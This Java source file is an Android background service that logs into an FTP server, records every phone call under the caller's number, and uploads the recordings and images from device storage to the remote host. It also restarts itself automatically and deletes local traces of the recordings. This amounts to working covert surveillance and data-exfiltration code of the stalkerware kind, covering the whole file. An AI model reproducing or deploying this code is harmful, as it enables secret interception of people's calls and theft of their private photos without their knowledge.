package com.tangcco170205_ftp.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.tangcco170205_ftp.Constants;
import com.tangcco170205_ftp.ftputils.FTPManager;
import com.tangcco170205_ftp.ftputils.ResultBean;
import com.tangcco170205_ftp.utils.AudioRecoderUtils;
import com.tangcco170205_ftp.utils.FileUtils;
import com.tangcco170205_ftp.utils.NetWorkUtil;

import java.io.File;
import java.io.IOException;
import java.util.List;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

public class MyService extends Service implements FileUtils.IGetDataImage {
    private static final int LOGIN_OK = 1;
    private AudioRecoderUtils recoderUtils;
    //ftp上传核心类
    private FTPManager ftpManager;
    private Executor mPool;


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //登录
        new LoginTask().execute();

        FileUtils iGetDataImage;
        iGetDataImage = new FileUtils();
        iGetDataImage.setDataImage(this);

        //初始化线程池
        mPool = Executors.newFixedThreadPool(4);
        recoderUtils = new AudioRecoderUtils();
        recoderUtils.setOnAudioStatusUpdateListener(new AudioRecoderUtils.OnAudioStatusUpdateListener() {
            /**
             * 更新录音分贝 此处用不到
             * @param db 当前声音分贝
             * @param time 录音时长
             */
            @Override
            public void onUpdate(double db, long time) {

            }

            @Override
            public void onStop(final String filePath) {
                //上传文件到服务器
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        upload(filePath, true);
                    }
                }).start();
            }
        });


        TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        manager.listen(new PhoneStateListener() {
            String incomingNumber = "";

            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);

                switch (state) {
                    case TelephonyManager.CALL_STATE_RINGING:// 来电
                        this.incomingNumber = incomingNumber;
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK:
                        //录音
                        try {
                            recoderUtils.setFileName(incomingNumber);
                            recoderUtils.startRecord();
                        } catch (IllegalStateException e) {
                            e.printStackTrace();
                        }

                        break;
                    case TelephonyManager.CALL_STATE_IDLE:// 挂断电话后回到空闲状态
                        // mediaRecorder不等于null，停止录音
                        recoderUtils.stopRecord();


                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE);
    }


    private void upload(String pathname,boolean isDelete) {
        ResultBean resultBean = null;

        try {
            // 上传;
            File localFile = new File(pathname);
            resultBean = ftpManager.uploading(localFile, FTPManager.REMOTE_PATH,isDelete);
            if (resultBean.isSucceed()) {
                Log.e("TAG", "uploading ok...time:" + resultBean.getTime()
                        + " and size:" + resultBean.getResponse());
            } else {
                Log.e("TAG", "uploading fail");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        String sdPath = FileUtils.getSDPath(true) + "/record";
        File file = new File(sdPath);
        FileUtils.deleteDir(file);
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        return Service.START_STICKY;
    }

    private boolean login() {

        ftpManager = new FTPManager(Constants.hostName, Constants.userName, Constants.password);
        // 打开FTP服务
        try {
            ftpManager.openConnect();
//            Toast.makeText(this, "登陆成功", Toast.LENGTH_SHORT).show();
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    /**
     * @param imagePaths
     */
    @Override
    public void addDataImage(final List<File> imagePaths) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                for (File file : imagePaths) {
                    try {
                        ftpManager.uploading(file, FTPManager.REMOTE_PATH, false);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                }

            }
        }).start();

    }

//    class PictureThread extends Thread {
//        String path;
//
//        public PictureThread(String path) {
//            this.path = path;
//        }
//
//        @Override
//        public void run() {
//            upload(path);
//        }
//    }

//    class AudioThread extends Thread {
//        String path;
//
//        public AudioThread(String path) {
//            this.path = path;
//        }
//
//        @Override
//        public void run() {
//            upload(path);
//        }
//    }

    class LoginTask extends AsyncTask<Void, Void, Boolean> {
        @Override
        protected Boolean doInBackground(Void... params) {


            return login();
        }

        @Override
        protected void onPostExecute(Boolean aVoid) {
            super.onPostExecute(aVoid);

            if (aVoid) {
                boolean wiFiConnected = NetWorkUtil.isWiFiConnected(getApplicationContext());
                if (wiFiConnected) {
                    mPool.execute(new Runnable() {
                        @Override
                        public void run() {
                            upload(FileUtils.getSDPath(true) + File.separator + "record", true);
                            FileUtils.getImages(MyService.this);
                        }
                    });
                }
            } else {
                Log.d("TAG", "onPostExecute: 登录失败");
            }
        }
    }


}
